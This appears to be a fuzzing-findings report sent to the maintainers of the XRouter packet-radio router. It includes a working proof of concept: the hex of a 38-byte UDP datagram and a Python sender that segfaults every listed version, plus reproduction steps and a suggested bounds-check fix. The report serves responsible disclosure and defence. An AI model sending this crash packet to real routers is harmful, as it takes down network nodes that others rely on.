# AXUDP fuzzing of XRouter — findings

Initial run of `fuzz/axudp-fuzz.py` against the `packethacking/xrouter`
images. The fuzzer sends generation + mutation AX.25 frames over UDP
into XRouter's AXUDP listener and uses an HTTP liveness probe to detect
crashes. This document summarises what the first short campaigns found
and how to reproduce each one.

## TL;DR

A single 38-byte UDP datagram — a UI frame with PID `0xCD`
(ARP-over-AX.25) carrying a 20-byte info field — reliably crashes
XRouter on every published version and every architecture
(504p..505c, amd64 / arm64 / armv7). The container exits with
status 139 and the daemon prints `Segmentation fault`.

A second class of stateful crashes is also reproducible from the
PRNG seed but has not yet been reduced to a minimal trigger.

## Target setup used

`fuzz/XROUTER.CFG` in this repo. Relevant bits:

```
IPADDRESS=44.128.128.128

HTTPPORT=80 80

INTERFACE=2
    TYPE=AXUDP
    MTU=256
ENDINTERFACE

PORT=2
    ID="AXUDP fuzz target"
    INTERFACENUM=2
    IPLINK=0.0.0.0
    UDPLOCAL=10093
    LEARN=1
ENDPORT
```

`LEARN=1` makes the port accept frames from any source IP, which is the
configuration recommended in your own `AD-HOC(9)` man page for casual
AXUDP peering. `UDPLOCAL=10093` is used (rather than the default 93)
only because the bundled defaults already bind UDP 93 somewhere and
fail to start a second listener there with `Duplicate UDPLOCAL`.

The full `XROUTER.CFG` and a `run-demo.sh` launcher are in `fuzz/`.

## Finding 1 — stateless segfault on PID 0xCD (ARP-over-AX.25)

### Trigger

38 bytes, sent in a single UDP datagram to `UDPLOCAL`:

```
8e72 88aa 9a40 e0    dst addr: G9DUM-0 (C-bit set, end-bit clear)
8c aa b4 b4 8a a4 6f src addr: FUZZER-7 (end-bit set)
03                   ctl: UI (P/F=0)
cd                   PID: 0xCD = ARPA Internet Address Resolution
8c aa b4 b4 8a a4 6e
8e 72 88 aa 9a 40
62 19 00 00 00 00 03 info: 20 bytes of garbage
3a f4                two trailing bytes (FCS slot — value irrelevant)
```

The minimum well-formed ARP-over-AX.25 info field per RFC 1042 is 30
bytes (HW type 2 + proto type 2 + HW len 1 + proto len 1 + op 2 +
sender HW 7 + sender proto 4 + target HW 7 + target proto 4 = 30).
This frame carries only 20 — strongly suggests the ARP parser reads
past the end of the supplied buffer.

### Versions / architectures affected

Every published combination, tested individually:

| Version | amd64 | arm64 | armv7 |
|---------|:---:|:---:|:---:|
| 504p | crash | crash | (not retested†) |
| 504q | crash | – | – |
| 504r | crash | – | – |
| 504s | crash | – | – |
| 504u | crash | – | – |
| 504v | crash | – | – |
| 504y | crash | – | – |
| 504z | crash | – | – |
| 505a | crash | – | – |
| 505b | crash | – | – |
| 505c | crash | crash | crash |

In every case `before=200 after=000 Exited (139)`, with
`Segmentation fault` in the logs. † 504p-armv7 has a separate
qemu-emulation issue where the HTTP listener never replies; bootstrap-
mode tests confirm the binary itself runs, but the configured-mode
target couldn't be probed cleanly under qemu.

### Reproduce

```sh
# Boot a clean target
docker run -d --name xr-arp-poc \
    -v "$(pwd)/fuzz:/data" \
    -p 18080:80 -p 10093:10093/udp \
    ghcr.io/packethacking/xrouter:505c-amd64

sleep 5
curl -s -o /dev/null -w 'before: HTTP=%{http_code}\n' http://127.0.0.1:18080/

# Send the 38-byte trigger
python3 -c '
import socket
p = bytes.fromhex(
    "8e7288aa9a40e0"
    "8caab4b48aa46f"
    "03cd"
    "8caab4b48aa46e8e7288aa9a4062190000000003"
    "3af4"
)
socket.socket(socket.AF_INET, socket.SOCK_DGRAM).sendto(p, ("127.0.0.1", 10093))
'

sleep 1
curl -s -o /dev/null -w 'after : HTTP=%{http_code}\n' http://127.0.0.1:18080/
docker ps -a --filter name=xr-arp-poc --format '{{.Status}}'
docker logs xr-arp-poc | tail -3
```

Expected output:

```
before: HTTP=200
after : HTTP=000
Exited (139) 1 second ago
--- /usr/local/bin/xrouter version 505c started ---
Segmentation fault
```

### Suggested fix

Bounds-check the info-field length in the ARP-over-AX.25 handler
before dereferencing past byte 0..29 of the payload. Any frame with
PID `0xCD` and info-length `< 30` should be dropped silently (a real
RFC 1042 ARP frame can't be shorter), logged at debug level, and
counted in the per-port "malformed frame" statistic. The same shape of
check is probably worth auditing in the other Layer 3 handlers reached
via UI-PID dispatch (`0x01`, `0xCC`, `0xCD`, `0xCF`, `0xF0`).

This bug is reachable on AXUDP (this PoC), on AXIP, on AXTCP, and on
real RF — anywhere an AX.25 UI frame can arrive. On bare-metal RF the
attacker just needs to be in range; on AXUDP/AXIP, anywhere on the
Internet.

## Finding 2 — stateful crashes (not yet minimised)

Several other crashes were observed but the saved batches don't
reproduce when replayed in isolation, which means the parser was in
some state set up by frames sent earlier in the run. The fuzzer's PRNG
is seeded, so they are still deterministically reproducible from the
seed:

```sh
docker run -d --name xr-state-poc \
    -v "$(pwd)/fuzz:/data" \
    -p 18080:80 -p 10093:10093/udp \
    ghcr.io/packethacking/xrouter:505c-amd64

sleep 5

python3 fuzz/axudp-fuzz.py \
    --target 127.0.0.1:10093 \
    --health http://127.0.0.1:18080/ \
    --seed 4082254966 \
    --max-frames 1500 \
    --probe-every 200
```

The first crash arrives at frame ~1200 in that run. Because the PRNG
is deterministic the same seed produces the same crash on every host.

Minimising these would benefit from saving the cumulative
post-startup frame history rather than just the last 200; that's a
straightforward fuzzer enhancement and not a bug in XRouter, but worth
mentioning in case you want to pursue it.

## How the fuzzer works (one paragraph)

`fuzz/axudp-fuzz.py` keeps a small seed corpus of well-formed frames
(AX.25 U/S/I/UI control variants, NetRom L3 headers, L4 segments —
CONREQ / INFO / DISC / RESET — and a NODES broadcast), mutates them
with bit-flips, byte replacement / insertion / deletion, region
duplication and "magic value" insertion (AX.25 control bytes, PIDs,
NetRom opcodes, 0x00/0x7F/0x80/0xFF), and sends them at ~700/s over
UDP. Every 200 frames it issues an HTTP GET on the configured HTTP
port; if that fails, it dumps the last batch as one-hex-per-line for
offline bisection and (optionally) restarts the target and keeps
going. A `--replay` mode binary-searches a saved batch back to a
single trigger frame, restarting the target between trials. Stdlib
only, no third-party deps, runs the same on amd64 / arm64 / armv7.

## Running it

Quick smoke run (default 5 minutes against latest):

```sh
fuzz/run-demo.sh
```

Specific version / duration:

```sh
fuzz/run-demo.sh 504v-amd64 600   # 504v, 10 minutes
fuzz/run-demo.sh 504u-arm64 300   # arm64 build under qemu
```

Crash dumps land in `fuzz/crashes/` (git-ignored).

## Caveats and what isn't covered

- The fuzzer reaches the AX.25 / NetRom parsers but not the higher
  layers that depend on a fully-established NetRom L4 circuit. To
  fuzz those, the fuzzer would need to first complete a CONREQ
  handshake and then mutate INFO frames within an open circuit.
  Straightforward to add if useful.
- The AGW emulator on TCP/8000 reaches some of the same parsers via a
  different framing — worth running a parallel fuzzer there too.
- The mutator is dumb (no coverage feedback). It still finds bugs
  quickly because the parser surface is wide and shallow, but a
  coverage-guided harness (e.g. AFL++ with an XRouter-as-library
  shim) would explore deeper. That's a much bigger undertaking.
